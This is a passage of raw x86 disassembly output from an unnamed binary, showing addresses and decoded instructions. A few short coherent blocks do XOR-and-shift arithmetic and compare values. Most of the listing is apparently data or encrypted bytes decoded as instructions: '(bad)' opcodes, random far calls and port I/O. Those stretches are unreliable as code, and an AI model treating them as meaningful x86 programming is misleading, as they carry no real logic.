  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [ebp+ecx*4+0x2a],0x4
  409ce0:	push   0xffffffcd
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi-0x51e7e7ee],bl
  409cea:	xchg   ebx,eax
  409ceb:	mov    edi,0xc9aaf028
  409cf0:	dec    edx
  409cf1:	daa    
  409cf2:	hlt    
  409cf3:	pop    ebx
  409cf4:	dec    ebp
  409cf5:	jle    0x409d02
  409cf7:	push   ecx
  409cf8:	(bad)  
  409cf9:	and    ah,bl
  409cfb:	xlat   BYTE PTR ds:[ebx]
  409cfc:	pop    ebp
  409cfd:	setl   BYTE PTR [eax+eiz*1]
  409d01:	(bad)  
  409d02:	cmp    al,0xb0
  409d04:	jl     0x409d46
  409d06:	jnp    0x409ca6
  409d08:	mov    es,WORD PTR [ecx]
  409d0a:	lahf   
  409d0b:	jnp    0xf0ec0507
  409d11:	mov    edx,0xdabc7976
  409d16:	push   esp
  409d17:	cmp    al,bl
  409d19:	leave  
  409d1a:	xor    BYTE PTR [esi+0x7f7e509b],0xcd
  409d21:	inc    ebx
  409d22:	mov    esp,0xf75e50b7
  409d27:	loope  0x409cd7
  409d29:	push   eax
  409d2a:	mov    eax,ds:0xf1e85e80
  409d2f:	adc    eax,0x9764418
  409d34:	std    
  409d35:	dec    esi
  409d36:	rcl    BYTE PTR [edx-0x57771eae],1
  409d3c:	fistp  QWORD PTR [esi]
  409d3e:	call   ebx
  409d40:	push   0x3b
  409d42:	iret   
  409d43:	xchg   BYTE PTR [edi-0x54407124],ch
  409d49:	(bad)  
  409d4b:	dec    eax
  409d4c:	fisttp DWORD PTR [ecx]
  409d4e:	inc    ebp
  409d4f:	rcl    BYTE PTR [ecx-0x63],cl
  409d52:	icebp  
  409d53:	out    0x6b,al
  409d55:	pop    ebx
  409d56:	out    0xfd,eax
  409d58:	pop    ebp
  409d59:	cmp    al,0x8
  409d5b:	xchg   ebx,eax
  409d5c:	std    
  409d5d:	mov    esp,0x298c718f
  409d62:	pushf  
  409d63:	xchg   edi,eax
  409d64:	or     BYTE PTR [eax+edi*4-0x42],ch
  409d68:	jp     0x409d57
  409d6a:	mov    al,0x3
  409d6c:	push   esi
  409d6d:	mov    dh,0xb9
  409d6f:	xor    edx,DWORD PTR [ebp-0x2]
  409d72:	fcom   DWORD PTR [ebp+0x25]
  409d75:	dec    ebp
  409d76:	(bad)  
  409d77:	sub    edx,ebp
  409d79:	add    BYTE PTR [ebx+0x73],bh
  409d7c:	push   cs
  409d7d:	adc    al,0xb6
  409d7f:	xchg   esp,eax
  409d80:	lods   eax,DWORD PTR ds:[esi]
  409d81:	pop    edx
  409d82:	in     al,0x67
  409d84:	out    dx,eax
  409d85:	sub    DWORD PTR [esi],esi
  409d87:	cmp    ebx,eax
  409d89:	fidiv  DWORD PTR [ebp+0x2a6d1942]
  409d8f:	xchg   BYTE PTR [ebx-0x615a0ad5],bh
  409d95:	ror    DWORD PTR [esi+eax*2+0x7],1
  409d99:	ja     0x409d9b
  409d9b:	mov    cl,0x71
  409d9d:	sbb    bh,BYTE PTR [ebx-0x2e]
  409da0:	mov    dl,0xcc
  409da2:	(bad)  
  409da3:	push   ss
  409da4:	or     ebx,DWORD PTR [ebx]
  409da6:	mov    eax,ds:0x76b534e8
  409dab:	addr16 out dx,eax
  409dad:	loope  0x409d4d
  409daf:	jp     0x409dda
  409db1:	cmp    dh,BYTE PTR [ebx+0x3196dc84]
  409db7:	ins    DWORD PTR es:[edi],dx
  409db8:	(bad)  
  409db9:	cmp    al,0xd6
  409dbb:	mov    BYTE PTR [esi+0x638794c5],0xf3
  409dc2:	push   0x22ee9bd8
  409dc7:	adc    eax,0x63fdeb95
  409dcc:	add    eax,0x21f255eb
  409dd1:	leave  
  409dd2:	sub    eax,0x1d5d63c6
  409dd7:	cmp    ah,BYTE PTR [edi]
  409dd9:	xor    BYTE PTR [ecx],bl
  409ddb:	repz jg 0x409d73
  409dde:	lds    eax,FWORD PTR [ecx+0x7901f32]
  409de4:	daa    
  409de5:	test   eax,0x4e7ada1a
  409dea:	(bad)  
  409deb:	fcom   QWORD PTR [ecx-0x5e]
  409dee:	enter  0xc890,0x8f
  409df2:	mov    al,0x6b
  409df4:	jnp    0x409e46
  409df6:	fs pop esi
  409df8:	xor    dh,ah
  409dfa:	push   ds
  409dfb:	jb     0x409dd6
  409dfd:	mov    ah,0x3
  409dff:	sbb    BYTE PTR [ebx+0x5f],cl
  409e02:	mov    al,0xb0
  409e04:	dec    esi
  409e05:	stos   DWORD PTR es:[edi],eax
  409e06:	repz push esi
  409e08:	inc    esp
  409e09:	sub    BYTE PTR [ecx],ch
  409e0b:	test   DWORD PTR [esi+0x17],ebp
  409e0e:	or     esi,DWORD PTR [edx+ebp*4+0x16e7d779]
  409e15:	jbe    0x409e0f
  409e17:	xor    DWORD PTR [esi+eax*1],0xffffffa1
  409e1b:	mov    edx,0x983279fa
  409e20:	add    DWORD PTR [ebx+eiz*8],ecx
  409e23:	std    
  409e24:	jo     0x409ea2
  409e26:	cwde   
  409e27:	mov    al,0x74
  409e29:	dec    esp
  409e2a:	xchg   ebp,eax
  409e2b:	ss aas 
  409e2d:	fmul   st,st(3)
  409e2f:	mov    DWORD PTR [ecx+ecx*2-0x4],esi
  409e33:	sub    al,0x74
  409e35:	mov    ebx,0x5eebcaae
  409e3a:	xor    DWORD PTR ss:[edi],eax
  409e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e3e:	mov    esp,0x90806501
  409e43:	mov    ebx,es
  409e45:	lea    esp,[ecx+0x31]
  409e48:	ret    
  409e49:	fucom  st(5)
  409e4c:	dec    ecx
  409e4d:	xchg   edi,eax
  409e4e:	mov    ds:0x33224b98,al
  409e53:	adc    al,0x34
  409e55:	fisttp QWORD PTR [esi-0x3bb3c987]
  409e5b:	call   0xff5ce901
  409e60:	outs   dx,DWORD PTR ds:[esi]
  409e61:	(bad)  
  409e62:	in     al,dx
  409e63:	jle    0x409edd
  409e65:	jne    0x409edb
  409e67:	mov    dh,0xb5
  409e69:	hlt    
  409e6a:	arpl   bp,ax
  409e6c:	sti    
  409e6d:	sbb    eax,DWORD PTR [edi]
  409e6f:	mov    esp,0x754268ec
  409e74:	ins    DWORD PTR es:[edi],dx
  409e75:	(bad)  [esi+0x6]
  409e78:	xor    DWORD PTR [edi+0x56],ecx
  409e7b:	das    
  409e7c:	push   es
  409e7d:	fcomp  DWORD PTR [edx-0x24]
  409e80:	sbb    al,0xb3
  409e82:	call   0x1b96d464
  409e87:	xor    eax,0x255aca6b
  409e8d:	jb     0x409e59
  409e8f:	pop    ecx
  409e90:	mov    DWORD PTR [ebx],esi
  409e92:	push   ebp
  409e93:	and    DWORD PTR [ebx+0x59203c5c],esp
  409e99:	in     al,dx
  409e9a:	push   ecx
  409e9b:	pop    ss
  409e9c:	ja     0x409e6c
  409e9e:	dec    ebp
  409e9f:	or     BYTE PTR [edi+0x52],0x32
  409ea3:	mov    edx,0x24e3bcc8
  409ea8:	retf   
  409ea9:	fdiv   st(4),st
  409eab:	or     dh,al
  409ead:	fdivr  st(5),st
  409eaf:	xchg   ebp,eax
  409eb0:	or     eax,0xcb1fa0ea
  409eb5:	loope  0x409edc
  409eb7:	ss jnp 0x409e62
  409eba:	jns    0x409f34
  409ebc:	inc    ebx
  409ebd:	ja     0x409e60
  409ebf:	aas    
  409ec0:	xchg   ebx,eax
  409ec1:	adc    BYTE PTR [eax-0x52],0x60
  409ec5:	xchg   ecx,eax
  409ec6:	leave  
  409ec7:	lods   al,BYTE PTR ds:[esi]
  409ec8:	sti    
  409ec9:	sbb    al,0x6f
  409ecb:	cld    
  409ecc:	shl    DWORD PTR ds:0x3268b553,1
  409ed2:	or     DWORD PTR [edi+0x28fb8282],esi
  409ed8:	sbb    BYTE PTR [esi+eiz*4-0x480f2b64],ch
  409edf:	add    al,0xd
  409ee1:	(bad)  
  409ee2:	jbe    0x409eb5
  409ee4:	push   0x9db53349
  409ee9:	cmp    esi,edi
  409eeb:	scas   al,BYTE PTR es:[edi]
  409eec:	cmp    BYTE PTR [ebx],0x69
  409eef:	call   0xf844:0xdbefb936
  409ef6:	lock imul ecx,DWORD PTR [esi-0x5d],0xb465eecb
  409efe:	in     eax,dx
  409eff:	inc    ecx
  409f00:	push   esi
  409f01:	mov    edi,DWORD PTR [edx]
  409f03:	test   al,0xa7
  409f05:	enter  0x22b1,0x74
  409f09:	mov    ebx,0xa968b6e
  409f0e:	int    0x54
  409f10:	and    BYTE PTR [esi+0x76e9772c],cl
  409f16:	cmp    BYTE PTR [ebx*4-0x19491e48],al
  409f1d:	in     al,dx
  409f1e:	mov    cl,0xef
  409f20:	adc    eax,DWORD PTR [eax-0x31]
  409f23:	lods   eax,DWORD PTR ds:[esi]
  409f24:	icebp  
  409f25:	scas   al,BYTE PTR es:[edi]
  409f26:	mov    bh,0x84
  409f28:	pop    edx
  409f29:	mov    dh,0xe0
  409f2b:	ret    
  409f2c:	clc    
  409f2d:	fcmovbe st,st(4)
  409f2f:	pop    eax
  409f30:	(bad)  
  409f31:	pop    ebx
  409f32:	out    0x5e,eax
  409f34:	js     0x409ecd
  409f36:	or     esp,DWORD PTR [ebp+edx*2-0xd18effc]
  409f3d:	sbb    eax,0xee79e773
  409f42:	pop    esi
  409f43:	xchg   edi,eax
  409f44:	xchg   dl,bl
  409f46:	out    dx,eax
  409f47:	data16 xor cl,BYTE PTR [ebx]
  409f4a:	call   0xbac4:0x9ad9181e
  409f51:	adc    eax,0x3e52b7aa
  409f56:	jb     0x409fae
  409f58:	sub    dh,BYTE PTR [edx-0x1723cf6b]
  409f5e:	xor    ebp,DWORD PTR [edx]
  409f60:	pop    es
  409f61:	xchg   ecx,eax
  409f62:	cmp    ah,bh
  409f64:	cmp    BYTE PTR [edi+0x1c],0xf2
  409f68:	enter  0x47a1,0x4b
  409f6c:	lea    eax,gs:[ebx]
  409f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f70:	push   esp
  409f71:	loop   0x409fd5
  409f73:	(bad)  
  409f74:	daa    
  409f75:	jp     0x409f91
  409f77:	fstp   DWORD PTR [esi+0x1e]
  409f7a:	out    0xbc,al
  409f7c:	call   0x4bc9:0x9fa0298c
  409f83:	xor    DWORD PTR [edx-0x35],ebp
  409f86:	fld    DWORD PTR [edi-0x48d656eb]
  409f8c:	cwde   
  409f8d:	dec    edx
  409f8e:	vpmacsww xmm13,xmm2,xmm0,XMMWORD PTR [edx-0x8]
  409f95:	xchg   ecx,eax
  409f96:	pop    ebx
  409f97:	push   ebp
  409f98:	sbb    bh,BYTE PTR [ecx-0x79]
  409f9b:	pop    eax
  409f9c:	test   BYTE PTR [eax],bl
  409f9e:	cdq    
  409f9f:	stos   BYTE PTR es:[edi],al
  409fa0:	call   0x7530:0x79e16a5d
  409fa7:	sahf   
  409fa8:	paddusw mm1,mm6
  409fab:	push   ebx
  409fac:	(bad)  
  409fad:	fisttp WORD PTR [edx-0x57]
  409fb0:	adc    al,0xf3
  409fb2:	mov    gs,WORD PTR [esi-0x75]
  409fb5:	sub    eax,0x2714a956
  409fba:	into   
  409fbb:	gs sub eax,0xa31e8f64
  409fc1:	and    edi,DWORD PTR [ecx+eiz*2+0x4b758a95]
  409fc8:	inc    ebx
  409fc9:	xor    eax,0xa9a75d2a
  409fce:	cwde   
  409fcf:	imul   eax,DWORD PTR [edx],0xffffff9d
  409fd2:	or     eax,0x5927f5cb
  409fd7:	push   ds
  409fd8:	cmp    eax,0x325b32ca
  409fdd:	xchg   esi,eax
  409fde:	out    dx,eax
  409fdf:	push   esi
  409fe0:	(bad)  
  409fe1:	xor    eax,DWORD PTR [esi]
  409fe3:	enter  0x4184,0x57
  409fe7:	mov    ah,0x0
  409fe9:	or     ecx,DWORD PTR [ebx+eiz*4+0x6ef973e8]
  409ff0:	mov    al,ds:0x55bd1616
  409ff5:	bound  ebx,QWORD PTR [eax-0x1edf5187]
  409ffb:	jbe    0x40a00a
  409ffd:	or     eax,0x3ad50d1b
  40a002:	cld    
  40a003:	js     0x40a04c
  40a005:	cmp    eax,0xb3e9057a
  40a00a:	and    BYTE PTR [edi+0x50599fdb],al
  40a010:	xchg   ebx,eax
  40a011:	mov    bl,0x34
  40a013:	outs   dx,BYTE PTR ds:[esi]
  40a014:	ror    DWORD PTR [esi+ebp*8-0x2b],0xaa
  40a019:	loope  0x409fac
  40a01b:	push   eax
  40a01c:	dec    eax
  40a01d:	push   es
  40a01e:	dec    eax
  40a01f:	pop    edx
  40a020:	ret    0xfe9e
  40a023:	push   edi
  40a024:	mov    dh,0xf6
  40a026:	add    cl,0x9b
  40a029:	push   0x3d
  40a02b:	outs   dx,BYTE PTR ds:[esi]
  40a02c:	aas    
  40a02d:	sub    BYTE PTR gs:[ecx+0x5d],dh
  40a031:	and    esp,DWORD PTR [ebp+0x0]
  40a034:	nop
  40a035:	push   esi
  40a036:	push   edi
  40a037:	and    DWORD PTR [eax-0x117676f0],eax
  40a03d:	add    eax,0x8d67fc35
  40a042:	push   eax
  40a043:	rol    esp,1
  40a045:	mov    bl,0x42
  40a047:	mov    ecx,0xa5c9ba7e
  40a04c:	and    BYTE PTR [ebx+0x79380449],bh
  40a052:	loop   0x40a004
  40a054:	jmp    0xe08bd493
  40a059:	pop    ds
  40a05a:	jp     0x40a0a7
  40a05c:	loop   0x40a09e
  40a05e:	(bad)  
  40a05f:	push   eax
  40a060:	idiv   DWORD PTR [ecx]
  40a062:	lods   al,BYTE PTR ds:[esi]
  40a063:	pop    eax
  40a064:	repz adc esi,DWORD PTR [edi+0x79]
  40a068:	scas   al,BYTE PTR es:[edi]
  40a069:	xor    DWORD PTR [eax],0x20
  40a06c:	pop    esp
  40a06d:	outs   dx,BYTE PTR ds:[esi]
  40a06e:	dec    ebp
  40a06f:	js     0x40a044
  40a071:	in     eax,0x27
  40a073:	sub    DWORD PTR [esi],eax
  40a075:	gs mov edi,0x68de0333
  40a07b:	std    
  40a07c:	lock jbe 0x40a025
  40a07f:	jne    0x40a0b3
  40a081:	sar    BYTE PTR [eax],0x5a
  40a084:	jbe    0x40a028
  40a086:	cld    
  40a087:	sub    edx,DWORD PTR [edi]
  40a089:	sbb    al,0x2a
  40a08b:	test   BYTE PTR [esp+ebx*4+0x64e1b31c],cl
  40a092:	arpl   WORD PTR [ebp-0x3eaaf608],si
  40a098:	call   0xbbb60a1a
  40a09d:	cli    
  40a09e:	scas   al,BYTE PTR es:[di]
  40a0a0:	xor    bh,BYTE PTR [edi]
  40a0a2:	dec    ebx
  40a0a3:	or     eax,0xcaabc46c
  40a0a8:	(bad)  
  40a0a9:	xlat   BYTE PTR ds:[ebx]
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	pop    edi
  40a129:	mov    ebx,0x3352b0af
  40a12e:	sbb    BYTE PTR [eax],bl
  40a130:	sahf   
  40a131:	adc    bl,BYTE PTR [eax]
  40a133:	sbb    BYTE PTR [eax-0x2d],ch
  40a136:	je     0x40a169
  40a138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a139:	sub    DWORD PTR [esi+0x24],ebx
  40a13c:	das    
  40a13d:	push   edi
  40a13e:	and    eax,0xfb765eaa
  40a143:	dec    esi
  40a144:	stos   BYTE PTR es:[edi],al
  40a145:	enter  0xa60f,0x3a
  40a149:	mov    eax,esp
  40a14b:	and    BYTE PTR [edi],0xd2
  40a14e:	mov    ebp,0xc9e4131c
  40a153:	adc    esp,DWORD PTR [ebp-0x21]
  40a156:	xchg   ebx,eax
  40a157:	cmp    BYTE PTR [ebx+0xec24a5a],bl
  40a15d:	jmp    0x759d:0x9b767d16
  40a164:	or     eax,0xdb1bf205
  40a169:	in     eax,dx
  40a16a:	loop   0x40a1aa
  40a16c:	aaa    
  40a16d:	xor    BYTE PTR [edx+0x280a34bc],0x5d
  40a174:	lods   al,BYTE PTR ds:[esi]
  40a175:	mov    bl,BYTE PTR [esi+ebp*2]
  40a178:	cwde   
  40a179:	jl     0x40a1e1
  40a17b:	jb     0x40a1ab
  40a17d:	inc    ebx
  40a17e:	lods   al,BYTE PTR ds:[esi]
  40a17f:	fwait
  40a180:	jo     0x40a152
  40a182:	popa   
  40a183:	imul   esp,DWORD PTR [eax+esi*1+0x7dd42287],0x4ebcbece
  40a18e:	mov    ebx,0x86750c5c
  40a193:	aam    0xb6
  40a195:	test   DWORD PTR [edx+0x5dbdfa3e],0xe46c2d59
  40a19f:	jns    0x40a1fd
  40a1a1:	xor    dl,ah
  40a1a3:	adc    edi,DWORD PTR [ebx-0x392a01c3]
  40a1a9:	jb     0x40a142
  40a1ab:	mov    ch,0x9e
  40a1ad:	mov    esp,DWORD PTR ds:[eax]
  40a1b0:	mul    cl
  40a1b2:	mov    DWORD PTR [edi],edx
  40a1b4:	pop    esi
  40a1b5:	mov    esp,0x22a86ffc
  40a1ba:	mov    eax,0xcf2ef131
  40a1bf:	sbb    BYTE PTR [edx-0x280ed8cc],ah
  40a1c5:	(bad)  
  40a1c6:	fadd   QWORD PTR ds:0x2cc0cb62
  40a1cc:	out    0x1,al
  40a1ce:	cmp    eax,0xf3f2d817
  40a1d3:	js     0x40a245
  40a1d5:	dec    edi
  40a1d6:	xchg   edi,eax
  40a1d7:	pop    ebp
  40a1d8:	xor    BYTE PTR [edi+0x70],dl
  40a1db:	or     eax,0x83cfa7aa
  40a1e0:	sub    bl,dh
  40a1e2:	sub    dh,BYTE PTR [ebx-0x20271e6e]
  40a1e8:	add    DWORD PTR [ebx],esp
  40a1ea:	mov    ebx,0xc1e02f58
  40a1ef:	cli    
  40a1f0:	inc    edi
  40a1f1:	add    al,0x3f
  40a1f3:	inc    ecx
  40a1f4:	not    ebp
  40a1f6:	lock cmp DWORD PTR [eax],edx
  40a1f9:	dec    ebx
  40a1fa:	loope  0x40a1dd
  40a1fc:	fst    DWORD PTR [ecx+edx*4]
  40a1ff:	sub    eax,esp
  40a201:	outs   dx,DWORD PTR ds:[esi]
  40a202:	or     dl,BYTE PTR [ecx]
  40a204:	test   DWORD PTR [edi-0x67],ecx
  40a207:	add    eax,0x283d23ae
  40a20c:	dec    esi
  40a20d:	inc    esp
  40a20e:	in     eax,0xd1
  40a210:	pop    ds
  40a211:	sub    eax,0x5728e54b
  40a216:	pop    ds
  40a217:	cmp    al,0xba
  40a219:	scas   eax,DWORD PTR es:[edi]
  40a21a:	sub    DWORD PTR [esi+edi*4],0xfffffff0
  40a21e:	push   eax
  40a21f:	inc    esp
  40a220:	mov    bh,0x34
  40a222:	cmp    DWORD PTR [eax+0xe7cf4b1],0x305548e0
  40a22c:	sub    al,0xf5
  40a22e:	jo     0x40a25a
  40a230:	pop    esp
  40a231:	neg    edx
  40a233:	push   edx
  40a234:	push   edi
  40a235:	and    cl,BYTE PTR [eax]
  40a237:	das    
  40a238:	jmp    0x40a27d
  40a23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a23b:	cdq    
  40a23c:	je     0x40a1dc
  40a23e:	or     al,BYTE PTR [ecx]
  40a240:	stos   BYTE PTR es:[edi],al
  40a241:	lock aad 0x22
  40a244:	leave  
  40a245:	jnp    0x40a2b9
  40a247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a248:	mov    cl,0x4f
  40a24a:	int3   
  40a24b:	(bad)  
  40a24c:	mov    ds:0x947079f2,al
  40a251:	in     al,0x58
  40a253:	scas   eax,DWORD PTR es:[edi]
  40a254:	push   esi
  40a255:	inc    ebp
  40a256:	dec    ecx
  40a257:	jns    0x40a256
  40a259:	pop    ss
  40a25a:	sbb    DWORD PTR [ecx-0x4d2b7fdb],ebx
  40a260:	mov    ds:0xc0b0cd34,al
  40a265:	sbb    al,0x7d
  40a267:	mov    bl,0x94
  40a269:	mov    BYTE PTR [edx-0x1df37bb7],bl
  40a26f:	arpl   WORD PTR [ebx],sp
  40a271:	fwait
  40a272:	mov    ds:0xcc59043e,al
  40a277:	inc    esi
  40a278:	(bad)  
  40a279:	jnp    0x40a213
  40a27b:	ja     0x40a28e
  40a27d:	imul   esi,DWORD PTR [edi],0x2a
  40a280:	bnd data16 jno 0x40a302
  40a284:	jnp    0x40a2cc
  40a286:	mul    DWORD PTR ds:0xcceef43
  40a28c:	and    dh,BYTE PTR [edx+0x1d]
  40a28f:	mov    cs,ecx
  40a291:	(bad)  
  40a293:	inc    esp
  40a294:	pop    ecx
  40a295:	scas   eax,DWORD PTR es:[edi]
  40a296:	adc    al,0xb1
  40a298:	pop    edi
  40a299:	dec    eax
  40a29a:	xor    cl,ch
  40a29c:	(bad)  
  40a29d:	loope  0x40a281
  40a29f:	addr16 mov eax,ds:0x4669
  40a2a3:	xor    BYTE PTR [ebp+0x7f],ch
  40a2a6:	cmp    al,0xbb
  40a2a8:	pushf  
  40a2a9:	fcomip st,st(1)
  40a2ab:	das    
  40a2ac:	mov    ch,0xb6
  40a2ae:	adc    eax,0x9bd05d3
  40a2b3:	xor    al,0x11
  40a2b5:	popaw  
  40a2b7:	inc    edi
  40a2b8:	mov    esp,DWORD PTR [eax+0x26]
  40a2bb:	call   0xf2914594
  40a2c0:	pop    ebx
  40a2c1:	fwait
  40a2c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2c3:	xchg   BYTE PTR [edi],al
  40a2c5:	nop
  40a2c6:	mov    cl,0x3e
  40a2c8:	push   es
  40a2c9:	pop    esi
  40a2ca:	shl    ch,1
  40a2cc:	push   es
  40a2cd:	cdq    
  40a2ce:	xchg   edx,eax
  40a2cf:	xchg   ebp,eax
  40a2d0:	dec    edi
  40a2d1:	jo     0x40a255
  40a2d3:	retf   
  40a2d4:	adc    al,0x18
  40a2d6:	(bad)  
  40a2d8:	xor    eax,0x84029896
  40a2dd:	mov    esi,DWORD PTR [edi+0x4ed50a25]
  40a2e3:	jbe    0x40a2d0
  40a2e5:	mov    ecx,0xb8017e7f
  40a2ea:	sub    edi,ebp
  40a2ec:	dec    ebx
  40a2ed:	out    0xfe,eax
  40a2ef:	push   cs
  40a2f0:	scas   al,BYTE PTR es:[edi]
  40a2f1:	adc    al,bh
  40a2f3:	test   eax,0x1f021bcb
  40a2f8:	dec    edx
  40a2f9:	pop    ss
  40a2fa:	(bad)  
  40a2fb:	cmp    DWORD PTR [esi+0x46],edx
  40a2fe:	dec    esp
  40a2ff:	xor    al,0x9f
  40a301:	sbb    BYTE PTR [edi-0x50312d9d],dh
  40a307:	(bad)  
  40a308:	jmp    0x9ed854f6
  40a30d:	mov    ch,0x50
  40a30f:	cmp    DWORD PTR [ecx+0xc],esi
  40a312:	ror    DWORD PTR [ebp-0x2d],cl
  40a315:	pop    edi
  40a316:	out    0x40,al
  40a318:	clc    
  40a319:	pop    ecx
  40a31a:	sbb    al,0x4
  40a31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a31d:	or     dh,BYTE PTR [ebp-0x625cc540]
  40a323:	jmp    0x94682edb
  40a328:	(bad)  
  40a329:	sub    edx,DWORD PTR ds:0x98d75083
  40a32f:	add    DWORD PTR [ebp+0x2d90a2eb],edx
  40a335:	retf   
  40a336:	sub    eax,0xa1bbcbd0
  40a33b:	mov    ah,0xb2
  40a33d:	sub    esp,esi
  40a33f:	jmp    0xd0b0:0xfa740aff
  40a346:	(bad)  
  40a347:	fdivr  DWORD PTR [ebx-0x25073ab3]
  40a34d:	inc    eax
  40a34e:	inc    esi
  40a34f:	fmul   QWORD PTR [edi+0x5eeb6756]
  40a355:	stos   BYTE PTR es:[edi],al
  40a356:	in     al,dx
  40a357:	nop
  40a358:	cdq    
  40a359:	xchg   bl,dl
  40a35b:	cmp    BYTE PTR [eax-0x29],bh
  40a35e:	ds ja  0x40a32b
  40a361:	nop
  40a362:	cmc    
  40a363:	pop    ecx
  40a364:	cmc    
  40a365:	mov    ch,0x6c
  40a367:	rcr    BYTE PTR [ebp+0x30],1
  40a36a:	jle    0x40a3ce
  40a36c:	mov    ds:0x303f061c,eax
  40a371:	jb     0x40a37b
  40a373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a374:	lds    ecx,FWORD PTR [ecx-0x35d689db]
  40a37a:	(bad)  
  40a37b:	cmc    
  40a37c:	gs retf 0x1fc9
  40a380:	dec    edi
  40a381:	call   0xdb688286
  40a386:	dec    ebx
  40a387:	ficom  WORD PTR [eax-0xf]
  40a38a:	or     edi,eax
  40a38c:	imul   ebx,DWORD PTR [ebx*4-0x6270c713],0x1d13a8ef
  40a397:	adc    esp,0xffffffac
  40a39a:	dec    eax
  40a39b:	mov    bh,0x52
  40a39d:	outs   dx,DWORD PTR ds:[esi]
  40a39e:	mov    al,0xf0
  40a3a0:	mov    eax,0x313a3a1b
  40a3a5:	les    ebx,FWORD PTR [esi-0x2b]
  40a3a8:	icebp  
  40a3a9:	push   es
  40a3aa:	icebp  
  40a3ab:	inc    ebp
  40a3ac:	popa   
  40a3ad:	mov    al,ds:0x190a15ca
  40a3b2:	inc    eax
  40a3b3:	push   edx
  40a3b4:	bound  ebx,QWORD PTR [ecx+0x58012d28]
  40a3ba:	sbb    dh,ch
  40a3bc:	outs   dx,BYTE PTR es:[esi]
  40a3be:	pop    ebx
  40a3bf:	sub    dh,BYTE PTR [esi-0x2f66a8f0]
  40a3c5:	fimul  WORD PTR [ecx-0x43e0779b]
  40a3cb:	clc    
  40a3cc:	out    dx,eax
  40a3cd:	cmp    al,0x9a
  40a3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3d0:	push   0xffffffd2
  40a3d2:	dec    ecx
  40a3d3:	aad    0x39
  40a3d5:	sbb    eax,0x9e26ffb9
  40a3da:	retf   0xf32e
  40a3dd:	aas    
  40a3de:	add    BYTE PTR [esp+edx*1],bl
  40a3e1:	xchg   ecx,eax
  40a3e2:	xchg   ecx,eax
  40a3e3:	jecxz  0x40a45d
  40a3e5:	adc    al,0x29
  40a3e7:	imul   edx,esp,0x4d3c6db1
  40a3ed:	aaa    
  40a3ee:	pop    esp
  40a3ef:	icebp  
  40a3f0:	and    ebx,ebx
  40a3f2:	enter  0x5cc6,0x6f
  40a3f6:	daa    
  40a3f7:	jbe    0x40a428
  40a3f9:	pop    eax
  40a3fa:	icebp  
  40a3fb:	shr    BYTE PTR [eax+0x5e],0x72
  40a3ff:	and    al,0x95
  40a401:	sbb    DWORD PTR [esi+0x2e8e9f8c],eax
  40a407:	movnti DWORD PTR ds:0x98ace902,ebx
  40a40e:	jo     0x40a3c7
  40a410:	pushf  
  40a411:	ss popa 
  40a413:	jmp    0x9cab3b1c
  40a418:	imul   BYTE PTR [edx-0x22b1ca06]
  40a41e:	setg   ch
  40a421:	mov    dh,0xf0
